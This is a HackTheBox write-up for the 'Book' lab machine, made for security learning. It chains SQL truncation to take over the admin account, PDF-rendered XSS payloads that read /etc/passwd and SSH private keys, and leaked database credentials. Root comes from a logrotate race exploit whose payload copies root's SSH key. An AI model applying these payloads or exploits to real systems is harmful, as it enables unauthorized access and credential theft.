# Book - HackTheBox WriteUp

**Book** was an awesome box with a lot to learn, starting with a vintage SQL truncation vulnerability, then a Cross site scripting attack via PDF's to obtain user credentials and finally taking advantage of a vulnerability on Lograte to escalate privileges to root.


![info](/images/book/info.png)

### Enumeration & Information Gathering

Nmap:

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
```

Gobuster Port 80:

```
gobuster -u http://10.10.10.176:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp" -o "/mnt/hgfs/pwn_share/Machines/Book/results/10.10.10.176/scans/tcp_80_http_gobuster.txt

/admin (Status: 301) [Size: 312]
/books.php (Status: 302) [Size: 0]
/contact.php (Status: 302) [Size: 0]
/db.php (Status: 200) [Size: 0]
/docs (Status: 301) [Size: 311]
/download.php (Status: 302) [Size: 0]
/feedback.php (Status: 302) [Size: 0]
/home.php (Status: 302) [Size: 0]
/images (Status: 301) [Size: 313]
/index.php (Status: 200) [Size: 6800]
/index.php (Status: 200) [Size: 6800]
/logout.php (Status: 302) [Size: 0]
/profile.php (Status: 302) [Size: 0]
/search.php (Status: 302) [Size: 0]
/server-status (Status: 403) [Size: 277]
/settings.php (Status: 302) [Size: 0]
```
 
#### Scanning 



#### Service Enumeration 
80: The home page, there seems to be a registration page so we register


After, that we login and we are greeted with the Book Library

![loged_in](/images/book/loged_in.png)

Navigating to books.php

![books_php](/images/book/books_php.png)

Observation: when you clik on the images, a PDF is downloaded.

![books_downloaded](/images/book/books_downloaded.png)


Moving on to the "Collections" pages, we see there if a file upload feature to upload a book to the Library.

![collections_php](/images/book/collections_php.png)



and finally the "Contact Us" page

![contact_us](/images/book/contact_us.png)

While we are here, we quickly fill out the form, send it and get a pop up message sent back. This could be a potential XSS, let's keep this in mind and come back after exploring the file upload section and any other services.

The contact form also reveals the admin email address (admin@book.htb)

With that we also add book.htb to our hosts file and check if other vhosts are on the machine.

Feddback.php also seems to throw a pop-up after the form is submitted.

There is also a search functionality (search.php) under books.

### Exploitation
#### Foothold 

Looking at gobuster results, there was an admin page

We go to admin.php and test with the credentials of our registered user john 
and receive a dialog box saying "Nope!".

Going back to the register form on the home page. While viewing the source code of the page, it contains javascript code showing the limits on the admin and email form fields

![limits](/images/book/limits.png)

After testing normal SQL injection attacks without success, trying to register with the email address admin@book.htb says user exsists!.

After some research, there is a vintage SQL tuncation attack that allows an attacker to overwrite fields after crossing the limit of the field.

Testing SQL truncation attack on this form will be done by intercepting and modifying the traffic via burp as the browser would not allow us to exceed those specified limits.

![sql_trunc](/images/book/sql_trunc.png)

Then on the admin panel, using the new password, access is granted and contents uploaded by the normal user accounts can now be reviewed.

**XXS Test:**

Uploading a sample pdf and simply addin bold html tags, then inspecting the collection as admin shows that the text html tags is interpreted and the text is shown in bold, in other words reflacted back to the admin user.

![xss_find](/images/book/xss_find.png)

The same approach was tested on the contact us form, howver it was not reflected.

A google search for "**using xss to read local files**" leads to this interesting article about XXS in PDF documents which looks like would suits our needs at the moment

Following the article, the /etc/passwd file is read and a user "reader" is discovered in the output.

Trying to read this user's ssh key

Upload by normal user:
```
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script> 
```

![ssh_key](/images/book/ssk_key.png)

This was successul and the key is copied to the local box ready for use.

After applying the correct file permission for ssh keys (600) and trying to authenticate, an error "invalid format" is received.

Upon comparing this SSH key using "wc -l" with other keys the key seemed to be some character short. Also using "cat" to display the keys one after another shows that the reader key was truncated to the right.

Going back to the pdf file, it is also somewhat observerable that the entire text has not been revealed. It appears zommed in, so maybe there is a way to minimize the font in javascript or wrap the text so that it's not cut off.


Writing the file contents inside an HTML \<pre> tag would fix this issue

```
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write("<pre>"+this.responseText+"</pre>")
};
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script> 
```

Text in a \<pre> element is displayed in a fixed-width font, and the text preserves both spaces and line breaks. The text will be displayed exactly as written in the HTML source code. 
https://www.w3schools.com/tags/tag_pre.asp

![ssh_key_pre](/images/book/ssk_key_pre.png)

Now that the ssh key is obtained in the correct format, it time to login.
The user flag can also be obtained after login.

![user](/images/book/user.png)


#### Post Exploitation Enumeration 

Enumerating the /var/www/html directory, the credentials to the local mysql database can be found in db.php

```
reader@book:/var/www/html$ cat db.php 
<?php
$conn = mysqli_connect("localhost","book_admin","I_Hate_Book_Reading","book");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```
>user: book_admin

>password: I_Hate_Book_Reading
database: book

Mysql enumeration:
```
mysql -u book_admin -p book
use book;
show tables
select * from users


admin      | admin@book.htb | Sup3r_S3cur3_P455 
```

The password does not work for anything else.

## Privilege Escalation 

Moving on by running linpeas.sh the target

An interesting output that is seen is:

```
[+] Different processes executed during 1 min (interesting is low number of repetitions)ok.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs/usr/bin/expect -f /root/cron_root
    300 /bin/sh -c /root/cron_root
    298 ssh -i .ssh/id_rsa localhost
    272 sshd: root@pts/3
     16 /usr/bin/python3 /usr/bin/landscape-sysinfo
     16 /bin/sh /etc/update-motd.d/50-landscape-sysinfo
      4 /bin/sh /etc/update-motd.d/91-release-upgrade
      4 /bin/sh /etc/update-motd.d/80-esm
      2 /usr/bin/python3 -Es /usr/bin/lsb_release -ds
      2 /usr/bin/python3 -Es /usr/bin/lsb_release -cs
      1 /usr/bin/python3 -Es /usr/bin/lsb_release -sd
      1 sshd: root
      1 mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';
      1 cut -d  -f4
      1 /bin/sh /root/clean.sh
      1 /bin/sh -c /root/clean.sh
```

This signifies a cron job. To get more details, pspy is uploaded to the box and ran

![logrotate](/images/book/logrotate.png)

It appears that logrotate runs every 5 seconds with the config file /root/log.cfg

Back on the home directory of user reader, the backup folder contains access.log and access.log.1

Echo'ing any input into access.log causes triggers a log rotation and copies the contents to access.log.1.

A google search for "logrotate cron privilege escalation" brings up a vulverability explained here https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges

The github: https://github.com/whotwagner/logrotten

After reading the report, replicating the PoC was the next step. However, the target was not returning any sort of reverse shell.

One interesting command from linpeas.sh output was root authenticating with an ssh key 

> ssh -i .ssh/id_rsa localhost

At this point it would be a safe bet to assume that there is an ssh key "id_rsa" in the /root/.ssh.

changing the payloadfile to

> if [ `id -u` -eq 0 ]; then (cat /root/.ssh/id_rsa > /tmp/root_rsa &); fi

Running the script 

> nice -n 20 ./logrotten -p payloadfile /home/reader/backups/access.log

And triggering the rotation by echo'ing anything to the access.log file

> echo '' > access.log

After a couple of tries, the /tmp/root_rsa file is created and the root SSH key is obtained!

![logrotate_exploit](/images/book/logrotate_exploit.png)

The root key can now be used to authenticate to the target and the root flag can be read as well.

Thanks for reading!

### Appendix

SQL Truncation Vulnerable code:

```
reader@book:/var/www/html/admin$ cat  users.php 
<?php
include("../db.php");
session_start();
if(isset($_SESSION["admin"]))
{
        $stmt=$conn->prepare("select name from users where email=?");
        $stmt->bind_param('s',$_SESSION["admin"]);
        $stmt->execute();
        $result = $stmt->get_result();
        $row = $result->fetch_assoc();
        $user = $row['name'];
        if(isset($_GET["email"]))
        {
                $email=$_GET["email"];
                $stmt=$conn->prepare("delete from users where email=? and email!='admin@book.htb'");
                $stmt->bind_param('s',$email);
                $stmt->execute();
                header('location: /admin/users.php');
        }
?>
<!DOCTYPE html>
<html lang="en">


--- snipped---
--- snipped---


$stmt=$conn->prepare("select name,email from users where email!=?");
$stmt->bind_param('s',$_SESSION["admin"]);
$stmt->execute();
$result = $stmt->get_result();
while($row=$result->fetch_assoc())
{
        echo '<tr>';
        echo '<td>';echo htmlspecialchars($row["name"]);'</td>';
        echo '<td>';echo $row["email"];'</td>';
        echo '<td><a href="/admin/users.php?email=';echo $row["email"];echo '">Delete</a></td>';
        echo '</tr>';
        echo '</table';
}
$stmt->close();
?>
</body>
</html>

<?php
}
else
{
        header('location: index.php');
}
?>
```


Weak Loogin check on **index.php**:

> if($email==="admin@book.htb")

```
reader@book:/var/www/html/admin$ cat index.php 
<?php
include "../db.php";
session_start();
if($_SERVER['REQUEST_METHOD'] === 'POST')
{
        $stmt=$conn->prepare("select email,password from users where email=? and password=?");
        $stmt->bind_param('ss',$_POST['email'],$_POST['password']);
        $stmt->execute();
        $result = $stmt->get_result();
        $num_rows = $result->num_rows;
        if($num_rows > 0)
        {
                $row=$result->fetch_assoc();
                $email=trim($row["email"]," ");
                if($email==="admin@book.htb")
                {
                        $_SESSION["admin"]=$row['email'];
                        header('location: /admin/home.php');
                }
                else
                {
                        echo '<script>alert("Nope!");window.location="/admin/index.php";</script>';
                }
        }
        else
        {
                echo '<script>alert("Nope!");window.location="/admin/index.php";</script>';
        }
}
else
{
?>
```





**log.cfg:**

```
root@book:~# cat log.cfg                                                                                                     
/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}
root@book:~# 

```

**Root Cron:**
```
crontab -l
@reboot /root/reset.sh
* * * * * /root/cron_root
*/5 * * * * rm /etc/bash_completion.d/*.log*
*/2 * * * * /root/clean.sh
```


**clean.sh:**
```
root@book:~# cat clean.sh 
#!/bin/sh
mysql book -e "delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';"
mysql book -e "delete from collections where email!='egotisticalSW_was_here@book.htb';"
```

**cron_root:**

```
root@book:~# cat cron_root 
#!/usr/bin/expect -f
spawn ssh -i .ssh/id_rsa localhost
expect eof
exit
```

**log.sh:**

```
root@book:~# cat log.sh 
#!/bin/sh
/usr/sbin/logrotate -f /root/log.cfg
```




POST XSS FORM:
```

POST /collections.php HTTP/1.1

Host: book.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://book.htb/collections.php

Content-Type: multipart/form-data; boundary=---------------------------1216109310209138377833924362

Content-Length: 435247

Connection: close

Cookie: PHPSESSID=e3msik615k05t07cm290b9gdc8

Upgrade-Insecure-Requests: 1

-----------------------------1216109310209138377833924362

Content-Disposition: form-data; name="title"


-----------------------------1216109310209138377833924362

Content-Disposition: form-data; name="author"


<script>

x=new XMLHttpRequest;

x.onload=function(){

document.write(this.responseText)

};

x.open("GET","file:///etc/hosts");

x.send();

</script> 

-----------------------------1216109310209138377833924362

Content-Disposition: form-data; name="Upload"; filename="1.pdf"

Content-Type: application/pdf


<script>
-----snipped-----

....
...

-----------------------------1216109310209138377833924362

Content-Disposition: form-data; name="Upload"

Upload

-----------------------------1216109310209138377833924362
```
